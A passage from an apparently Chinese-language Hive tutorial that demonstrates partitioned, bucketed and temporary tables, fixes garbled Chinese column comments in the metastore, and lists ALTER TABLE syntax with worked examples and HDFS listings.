<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">[root@hadoop02 datas]# hadoop fs -ls /hive/tests/test.db/page_view_3</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 20:03 /hive/tests/test.db/page_view_3/status=1</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 20:04 /hive/tests/test.db/page_view_3/status=2</span><br><span class="line">[root@hadoop02 datas]# hadoop fs -ls /hive/tests/test.db/page_view_3/status=1</span><br><span class="line">Found 2 items</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 20:03 /hive/tests/test.db/page_view_3/status=1/country=cn</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 20:04 /hive/tests/test.db/page_view_3/status=1/country=us</span><br><span class="line">[root@hadoop02 datas]# hadoop fs -ls /hive/tests/test.db/page_view_3/status=2</span><br><span class="line">Found 1 items</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-16 20:05 /hive/tests/test.db/page_view_3/status=2/country=cn</span><br></pre></td></tr></table></figure>
<p>可见多分区表的目录结构是嵌套的。</p>
<h4 id="桶表-Bucket-Table"><a href="#桶表-Bucket-Table" class="headerlink" title="桶表(Bucket Table)"></a>桶表(Bucket Table)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*创建桶表*/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> page_view_4</span><br><span class="line">(viewTime <span class="built_in">INT</span>, </span><br><span class="line">userid <span class="built_in">BIGINT</span> <span class="keyword">COMMENT</span> <span class="string">'用户ID'</span>,</span><br><span class="line">page_url <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'网页URL'</span>, </span><br><span class="line">referrer_url <span class="keyword">STRING</span>,</span><br><span class="line">ip <span class="keyword">STRING</span> <span class="keyword">COMMENT</span> <span class="string">'用户IP'</span>)</span><br><span class="line"><span class="keyword">COMMENT</span> <span class="string">'用户浏览信息'</span></span><br><span class="line">PARTITIONED <span class="keyword">BY</span>(<span class="keyword">status</span> <span class="keyword">STRING</span>, country <span class="keyword">STRING</span>)</span><br><span class="line">CLUSTERED <span class="keyword">BY</span>(userid) SORTED <span class="keyword">BY</span>(viewTime) <span class="keyword">INTO</span> <span class="number">5</span> BUCKETS</span><br><span class="line"> <span class="keyword">ROW</span> <span class="keyword">FORMAT</span> <span class="keyword">DELIMITED</span></span><br><span class="line">   <span class="keyword">FIELDS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">','</span></span><br><span class="line">   COLLECTION ITEMS <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'#'</span></span><br><span class="line">   <span class="keyword">MAP</span> <span class="keyword">KEYS</span> <span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'$'</span></span><br><span class="line"> <span class="keyword">STORED</span> <span class="keyword">AS</span> SEQUENCEFILE;</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"><span class="comment">#查看表信息</span></span></span><br><span class="line">hive (test2)&gt; describe page_view_4;</span><br><span class="line">OK</span><br><span class="line">viewtime            	int                 	                    </span><br><span class="line">userid              	bigint              	??ID                </span><br><span class="line">page_url            	string              	??URL               </span><br><span class="line">referrer_url        	string              	                    </span><br><span class="line">ip                  	string              	??IP                </span><br><span class="line">status              	string              	                    </span><br><span class="line">country             	string              	                    </span><br><span class="line">	 	 </span><br><span class="line"><span class="meta">#</span><span class="bash"> Partition Information	 	 </span></span><br><span class="line"><span class="meta">#</span><span class="bash"> col_name            	data_type           	comment             </span></span><br><span class="line">	 	 </span><br><span class="line">status              	string              	                    </span><br><span class="line">country             	string</span><br></pre></td></tr></table></figure>
<p>发现中文乱码,查看元数据中表信息:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*字段注释默认为latin1字符集*/</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`COLUMNS_V2`</span> (</span><br><span class="line">  <span class="string">`CD_ID`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`COMMENT`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">COLLATE</span> latin1_bin <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`COLUMN_NAME`</span> <span class="built_in">varchar</span>(<span class="number">767</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">COLLATE</span> latin1_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`TYPE_NAME`</span> mediumtext <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1,</span><br><span class="line">  <span class="string">`INTEGER_IDX`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`CD_ID`</span>,<span class="string">`COLUMN_NAME`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`COLUMNS_V2_N49`</span> (<span class="string">`CD_ID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`COLUMNS_V2_FK1`</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (<span class="string">`CD_ID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`CDS`</span> (<span class="string">`CD_ID`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`TABLE_PARAMS`</span> (</span><br><span class="line">  <span class="string">`TBL_ID`</span> <span class="built_in">bigint</span>(<span class="number">20</span>) <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`PARAM_KEY`</span> <span class="built_in">varchar</span>(<span class="number">256</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">COLLATE</span> latin1_bin <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`PARAM_VALUE`</span> mediumtext <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> latin1 <span class="keyword">COLLATE</span> latin1_bin,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`TBL_ID`</span>,<span class="string">`PARAM_KEY`</span>),</span><br><span class="line">  <span class="keyword">KEY</span> <span class="string">`TABLE_PARAMS_N49`</span> (<span class="string">`TBL_ID`</span>),</span><br><span class="line">  <span class="keyword">CONSTRAINT</span> <span class="string">`TABLE_PARAMS_FK1`</span> <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (<span class="string">`TBL_ID`</span>) <span class="keyword">REFERENCES</span> <span class="string">`TBLS`</span> (<span class="string">`TBL_ID`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改为utf8编码*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--修改表字段注解和表注解</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> COLUMNS_V2 <span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> <span class="keyword">COMMENT</span> <span class="built_in">VARCHAR</span>(<span class="number">256</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> TABLE_PARAMS <span class="keyword">MODIFY</span> <span class="keyword">COLUMN</span> PARAM_VALUE MEDIUMTEXT <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除表,重新创建;也可以修改字段的注释信息*/</span></span><br><span class="line">hive (test2)&gt; describe page_view_4;</span><br><span class="line">OK</span><br><span class="line">viewtime            	int                 	                    </span><br><span class="line">userid              	bigint              	用户ID                </span><br><span class="line">page_url            	string              	网页URL               </span><br><span class="line">referrer_url        	string              	                    </span><br><span class="line">ip                  	string              	用户IP                </span><br><span class="line">status              	string              	                    </span><br><span class="line">country             	string              	                    </span><br><span class="line">	 	 </span><br><span class="line"><span class="comment"># Partition Information	 	 </span></span><br><span class="line"><span class="comment"># col_name            	data_type           	comment             </span></span><br><span class="line">	 	 </span><br><span class="line">status              	string              	                    </span><br><span class="line">country             	string              	                    </span><br><span class="line">Time taken: 0.128 seconds, Fetched: 13 row(s)</span><br></pre></td></tr></table></figure>
<p>插入测试数据:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_4 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'cn'</span>,<span class="keyword">status</span>=<span class="string">'2'</span>) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="number">189434</span>,<span class="number">2</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.21.10'</span>),</span><br><span class="line"> (<span class="number">189354</span>,<span class="number">21</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>),</span><br><span class="line">  (<span class="number">189355</span>,<span class="number">22</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.42'</span>),</span><br><span class="line">   (<span class="number">189356</span>,<span class="number">21</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.43'</span>),</span><br><span class="line">    (<span class="number">189357</span>,<span class="number">22</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.44'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_4 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'cn'</span>,<span class="keyword">status</span>=<span class="string">'1'</span>) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="number">1894341</span>,<span class="number">3</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.21.10'</span>),</span><br><span class="line"> (<span class="number">1893542</span>,<span class="number">31</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>),</span><br><span class="line">  (<span class="number">1893552</span>,<span class="number">32</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.42'</span>),</span><br><span class="line">   (<span class="number">1893563</span>,<span class="number">31</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.43'</span>),</span><br><span class="line">    (<span class="number">1893574</span>,<span class="number">32</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.44'</span>);</span><br><span class="line"> </span><br><span class="line"> <span class="keyword">INSERT</span> OVERWRITE  <span class="keyword">TABLE</span> page_view_4 </span><br><span class="line"><span class="keyword">PARTITION</span> (country=<span class="string">'us'</span>,<span class="keyword">status</span>=<span class="string">'2'</span>) <span class="keyword">VALUES</span></span><br><span class="line"> (<span class="number">189435</span>,<span class="number">4</span>,<span class="string">'http://alibaba.com'</span>,<span class="string">'http://taobao.com'</span>,<span class="string">'134.4.21.10'</span>),</span><br><span class="line"> (<span class="number">189355</span>,<span class="number">41</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.41'</span>),</span><br><span class="line">  (<span class="number">189356</span>,<span class="number">42</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.42'</span>),</span><br><span class="line">   (<span class="number">1893566</span>,<span class="number">41</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.43'</span>),</span><br><span class="line">    (<span class="number">1893576</span>,<span class="number">42</span>,<span class="string">'http://163.com'</span>,<span class="string">'http://132.com'</span>,<span class="string">'143.43.34.44'</span>);</span><br></pre></td></tr></table></figure>
<p>查看HDFS中文件:</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 ~]# hadoop fs -ls /hive/tests/test.db/page_view_4/status=2/country=us</span><br><span class="line">Found 5 items</span><br><span class="line">-rwxr-xr-x   2 root supergroup         87 2018-01-17 10:52 /hive/tests/test.db/page_view_4/status=2/country=us/000000_0</span><br><span class="line">-rwxr-xr-x   2 root supergroup        218 2018-01-17 10:52 /hive/tests/test.db/page_view_4/status=2/country=us/000001_0</span><br><span class="line">-rwxr-xr-x   2 root supergroup        218 2018-01-17 10:52 /hive/tests/test.db/page_view_4/status=2/country=us/000002_0</span><br><span class="line">-rwxr-xr-x   2 root supergroup         87 2018-01-17 10:52 /hive/tests/test.db/page_view_4/status=2/country=us/000003_0</span><br><span class="line">-rwxr-xr-x   2 root supergroup        157 2018-01-17 10:52 /hive/tests/test.db/page_view_4/status=2/country=us/000004_0</span><br></pre></td></tr></table></figure>
<p>可以看到有5个文件,即分为5个桶。</p>
<h4 id="临时表-Temporary-Table"><a href="#临时表-Temporary-Table" class="headerlink" title="临时表(Temporary  Table)"></a>临时表(Temporary  Table)</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--创建临时表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TEMPORARY</span> <span class="keyword">TABLE</span> user_info_3 (<span class="keyword">id</span> <span class="built_in">INT</span> ,<span class="keyword">name</span> <span class="keyword">STRING</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--插入数据</span></span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> user_info_3 <span class="keyword">VALUES</span> (<span class="number">1</span>,<span class="string">'wang'</span>),(<span class="number">2</span>,<span class="string">'li'</span>);</span><br></pre></td></tr></table></figure>
<p>查看HDFS中数据</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@hadoop02 ~]# hadoop fs -ls /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db</span><br><span class="line">Found 5 items</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-17 10:42 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/Values__Tmp__Table__1</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-17 10:45 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/Values__Tmp__Table__2</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-17 10:47 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/Values__Tmp__Table__3</span><br><span class="line">drwxr-xr-x   - root supergroup          0 2018-01-17 10:50 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/Values__Tmp__Table__4</span><br><span class="line">drwx------   - root supergroup          0 2018-01-17 11:46 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d</span><br><span class="line">[root@hadoop02 ~]# hadoop fs -ls /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d</span><br><span class="line">[root@hadoop02 ~]# hadoop fs -ls /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d</span><br><span class="line">Found 1 items</span><br><span class="line">drwx------   - root supergroup          0 2018-01-17 11:50 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d/.hive-staging_hive_2018-01-17_11-50-29_681_7822027368902956312-1</span><br><span class="line">[root@hadoop02 ~]# hadoop fs -ls /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d</span><br><span class="line">Found 1 items</span><br><span class="line">-rwx------   2 root supergroup         12 2018-01-17 11:51 /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d/000000_0</span><br><span class="line">[root@hadoop02 ~]# hadoop fs -text /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d/000000_0</span><br><span class="line">1wang</span><br><span class="line">2li</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"><span class="comment"># quit退出hive 命令界面,临时表数据被删除</span></span></span><br><span class="line">[root@hadoop02 ~]# hadoop fs -text /tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d/000000_0</span><br><span class="line">text: `/tmp/hive/root/2c1479e2-6881-4208-8163-fbe991e3071d/_tmp_space.db/d2cd813e-faa4-4554-9311-84fc30200d6d/000000_0': No such file or directory</span><br></pre></td></tr></table></figure>
<p>作为临时表创建的表只在当前会话中可见。数据将存储在用户的scratch目录中，并在会话结束时删除。<br>如果一个临时表是在数据库中已经存在的永久表的数据库/表名创建的，那么在该会话中，对该表的任何引用都将解析为临时表，而不是永久表。用户将无法访问该会话中的原始表，而无需删除临时表，或将其重命名为一个不冲突的名称。<br>临时表有以下限制:<br>不支持分区列。<br>不支持创建索引。</p>
<blockquote>
<ul>
<li>修改表</li>
</ul>
</blockquote>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*重命名表*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">RENAME</span> <span class="keyword">TO</span> new_table_name;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*改变表的属性信息*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">SET</span> TBLPROPERTIES table_properties;</span><br><span class="line"> </span><br><span class="line">table_properties:</span><br><span class="line">  : (property_name = property_value, property_name = property_value, ... )</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表的注释*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">SET</span> TBLPROPERTIES (<span class="string">'comment'</span> = new_comment);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表的存储属性*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name CLUSTERED <span class="keyword">BY</span> (col_name, col_name, ...) [SORTED <span class="keyword">BY</span> (col_name, ...)]</span><br><span class="line">  <span class="keyword">INTO</span> num_buckets BUCKETS;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*添加SerDe属性*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">SET</span> SERDE serde_class_name [<span class="keyword">WITH</span> SERDEPROPERTIES serde_properties];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">SET</span> SERDEPROPERTIES serde_properties;</span><br><span class="line"></span><br><span class="line">serde_properties:</span><br><span class="line">  : (property_name = property_value, property_name = property_value, ... )</span><br><span class="line"></span><br><span class="line"><span class="comment">/*添加表约束*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> constraint_name PRIMARY <span class="keyword">KEY</span> (<span class="keyword">column</span>, ...) <span class="keyword">DISABLE</span> <span class="keyword">NOVALIDATE</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> <span class="keyword">CONSTRAINT</span> constraint_name <span class="keyword">FOREIGN</span> <span class="keyword">KEY</span> (<span class="keyword">column</span>, ...) <span class="keyword">REFERENCES</span> table_name(<span class="keyword">column</span>, ...) <span class="keyword">DISABLE</span> <span class="keyword">NOVALIDATE</span> <span class="keyword">RELY</span>;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">DROP</span> <span class="keyword">CONSTRAINT</span> constraint_name;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*添加表分区*/</span> </span><br><span class="line"></span><br><span class="line"> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ADD</span> [<span class="keyword">IF</span> <span class="keyword">NOT</span> <span class="keyword">EXISTS</span>] <span class="keyword">PARTITION</span> partition_spec [LOCATION <span class="string">'location'</span>][, <span class="keyword">PARTITION</span> partition_spec [LOCATION <span class="string">'location'</span>], ...];</span><br><span class="line"> </span><br><span class="line">partition_spec:</span><br><span class="line">  : (partition_column = partition_col_value, partition_column = partition_col_value, ...)</span><br><span class="line"></span><br><span class="line"> <span class="comment">/*重命名分区*/</span></span><br><span class="line"> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">PARTITION</span> partition_spec <span class="keyword">RENAME</span> <span class="keyword">TO</span> <span class="keyword">PARTITION</span> partition_spec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*交换分区*/</span></span><br><span class="line"><span class="comment">-- Move partition from table_name_1 to table_name_2</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name_2 <span class="keyword">EXCHANGE</span> <span class="keyword">PARTITION</span> (partition_spec) <span class="keyword">WITH</span> <span class="keyword">TABLE</span> table_name_1;</span><br><span class="line"><span class="comment">-- multiple partitions</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name_2 <span class="keyword">EXCHANGE</span> <span class="keyword">PARTITION</span> (partition_spec, partition_spec2, ...) <span class="keyword">WITH</span> <span class="keyword">TABLE</span> table_name_1;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*恢复分区 MSCK REPAIR TABLE*/</span></span><br><span class="line"></span><br><span class="line">MSCK <span class="keyword">REPAIR</span> <span class="keyword">TABLE</span> table_name;</span><br><span class="line"></span><br><span class="line"> <span class="comment">--Amazon Elastic MapReduce (EMR)'s 版本中：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">RECOVER</span> <span class="keyword">PARTITIONS</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*删除分区*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">DROP</span> [<span class="keyword">IF</span> <span class="keyword">EXISTS</span>] <span class="keyword">PARTITION</span> partition_spec[, <span class="keyword">PARTITION</span> partition_spec, ...]</span><br><span class="line">  [<span class="keyword">IGNORE</span> <span class="keyword">PROTECTION</span>] [<span class="keyword">PURGE</span>];            <span class="comment">-- (<span class="doctag">Note:</span> PURGE available in Hive 1.2.0 and later, IGNORE PROTECTION not available 2.0.0 and later)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*归档/解档分区*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name <span class="keyword">ARCHIVE</span> <span class="keyword">PARTITION</span> partition_spec;</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name UNARCHIVE <span class="keyword">PARTITION</span> partition_spec;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*改变列名称/类型/位置/注释*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">CHANGE</span> [<span class="keyword">COLUMN</span>] col_old_name col_new_name column_type</span><br><span class="line">  [<span class="keyword">COMMENT</span> col_comment] [<span class="keyword">FIRST</span>|<span class="keyword">AFTER</span> column_name] [<span class="keyword">CASCADE</span>|RESTRICT];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*添加/替换字段*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name </span><br><span class="line">  [<span class="keyword">PARTITION</span> partition_spec]                 <span class="comment">-- (<span class="doctag">Note:</span> Hive 0.14.0 and later)</span></span><br><span class="line">  <span class="keyword">ADD</span>|<span class="keyword">REPLACE</span> <span class="keyword">COLUMNS</span> (col_name data_type [<span class="keyword">COMMENT</span> col_comment], ...)</span><br><span class="line">  [<span class="keyword">CASCADE</span>|RESTRICT]                         <span class="comment">-- (<span class="doctag">Note:</span> Hive 1.1.0 and later)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区 文件格式*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">SET</span> FILEFORMAT file_format;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区 位置*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">SET</span> LOCATION <span class="string">"new location"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区联系*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name TOUCH [<span class="keyword">PARTITION</span> partition_spec];</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区的保护属性*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">ENABLE</span>|<span class="keyword">DISABLE</span> NO_DROP [<span class="keyword">CASCADE</span>];</span><br><span class="line"> </span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> partition_spec] <span class="keyword">ENABLE</span>|<span class="keyword">DISABLE</span> <span class="keyword">OFFLINE</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区的联系*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> (partition_key = <span class="string">'partition_value'</span> [, ...])] CONCATENATE;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*修改表/分区压缩信息*/</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> table_name [<span class="keyword">PARTITION</span> (partition_key = <span class="string">'partition_value'</span> [, ...])]</span><br><span class="line">  <span class="keyword">COMPACT</span> <span class="string">'compaction_type'</span>[<span class="keyword">AND</span> <span class="keyword">WAIT</span>]</span><br><span class="line">  [<span class="keyword">WITH</span> OVERWRITE TBLPROPERTIES (<span class="string">"property"</span>=<span class="string">"value"</span> [, ...])];</span><br></pre></td></tr></table></figure>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">--新建一个和已存在表的结构一样的表</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> user_info_4 <span class="keyword">LIKE</span> user_info_2;</span><br><span class="line"></span><br><span class="line"><span class="comment">--查看结构</span></span><br><span class="line">hive (test2)&gt; DESCRIBE user_info_4;</span><br><span class="line">OK</span><br><span class="line">id                  	int                 	user id             </span><br><span class="line">name                	string              	user name      </span><br><span class="line"></span><br><span class="line"><span class="comment">--重命名表</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info_4 <span class="keyword">RENAME</span> <span class="keyword">TO</span> user_info_5;</span><br><span class="line"></span><br><span class="line"><span class="comment">--添加字段</span></span><br><span class="line"> <span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info_5 <span class="keyword">ADD</span> <span class="keyword">COLUMNS</span> (age <span class="built_in">INT</span> <span class="keyword">COMMENT</span> <span class="string">'年龄'</span>,<span class="keyword">status</span> <span class="built_in">INT</span> <span class="keyword">COMMENT</span> <span class="string">'状态'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--修改表注释</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info_5 <span class="keyword">SET</span> TBLPROPERTIES (<span class="string">'comment'</span> = <span class="string">'用户信息5表'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">--修改表字段信息</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info_5 <span class="keyword">CHANGE</span> <span class="keyword">COLUMN</span> age ages <span class="built_in">INT</span> <span class="keyword">COMMENT</span> <span class="string">'用户年龄'</span> <span class="keyword">AFTER</span> <span class="keyword">status</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">--删除字段(REPALCE)</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> user_info_5 <span class="keyword">REPLACE</span> <span class="keyword">COLUMNS</span> (<span class="keyword">id</span> <span class="built_in">int</span> ,<span class="keyword">name</span> <span class="keyword">String</span>,age <span class="built_in">INT</span> <span class="keyword">COMMENT</span> <span class="string">'年龄'</span>);</span><br></pre></td></tr></table></figure>
<p>其他分区操作,参考具体语法实例.</p>
<blockquote>
<ul>
<li>删除表</li>
</ul>
